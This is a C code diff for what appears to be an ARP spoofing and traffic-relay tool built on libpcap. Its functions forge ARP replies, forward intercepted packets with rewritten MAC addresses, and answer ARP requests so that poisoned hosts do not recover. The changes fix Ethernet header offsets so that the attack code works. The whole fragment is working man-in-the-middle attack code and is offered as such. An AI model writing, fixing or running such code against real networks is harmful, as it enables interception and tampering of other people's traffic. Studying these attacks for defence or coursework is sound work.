@@ -67,7 +67,7 @@ int get_attacker_mac(char* device, uint8_t* out) {
   return 0;
 }
 
-void send_arp(pcap_t* handle, int packet_type, uint8_t* src_ip, uint8_t* dest_ip, uint8_t* src_mac, uint8_t* dest_mac) {
+void send_arp(pcap_t* handle, uint16_t packet_type, uint8_t* src_ip, uint8_t* dest_ip, uint8_t* src_mac, uint8_t* dest_mac) {
   packet pk;
   
   if(packet_type == REPLY) {
@@ -132,20 +132,19 @@ void relay_ip_packet(pcap_t* handle, uint8_t* my_ip, uint8_t* my_mac, uint8_t* s
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == -1 || res == -2) return;
   
-  if(packet[18] == 0x08 && packet[19] == 0x00) {
-    if(memcmp(packet+30, my_ip, 4)) {
+  if(packet[12] == 0x08 && packet[13] == 0x00) {
+    if(memcmp(packet+38, my_ip, 4)) {
       if(!memcmp(packet+6, src_mac, 6)){
         memcpy(relay, packet, header->caplen);
         for(int i = 0; i < 6; i++) {
           relay[i + 6] = my_mac[i];
-          relay[i + 22] = my_mac[i];
           relay[i] = dest_mac[i];
-          relay[i + 32] = dest_mac[i];
         }
       }
       pcap_sendpacket(handle, relay, header->caplen);
     }
   }
+  memset(relay, 0x00, sizeof(relay));
   return;
 }
 
@@ -155,20 +154,20 @@ void prevent_arp_recovery(pcap_t* handle, uint8_t* my_ip, uint8_t* src_mac) {
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == -1 || res == -2) return;
 
-  u_char* ret;
-  if(packet[18] == 0x80 && packet[19] == 0x06) {
-    if(memcmp(packet+30, my_ip, 4)) {
-      if(!memcmp(packet, src_mac, 6)) {
-        memcpy(ret, packet, header->caplen);
-        swap_ranges(ret, ret+6, ret+6);
-        swap_ranges(ret+22, ret+28, ret+32);
-        swap_ranges(ret+28, ret+32, ret+38);
-        ret[20] = 0x00;
-        ret[21] = 0x02;
-        pcap_sendpacket(handle, ret, header->caplen);
+  if(packet[12] == 0x08 && packet[13] == 0x06) {
+    if(memcmp(packet+38, my_ip, 4)) {
+      if(!memcmp(packet+6, src_mac, 6)) {
+        memcpy(relay, packet, header->caplen);
+        swap_ranges(relay, relay+6, relay+6);
+        swap_ranges(relay+22, relay+28, relay+32);
+        swap_ranges(relay+28, relay+32, relay+38);
+        relay[20] = 0x00;
+        relay[21] = 0x02;
+        pcap_sendpacket(handle, relay, header->caplen);
       }
     }
   }
+  memset(relay, 0x00, sizeof(relay));
   return;
 }
 
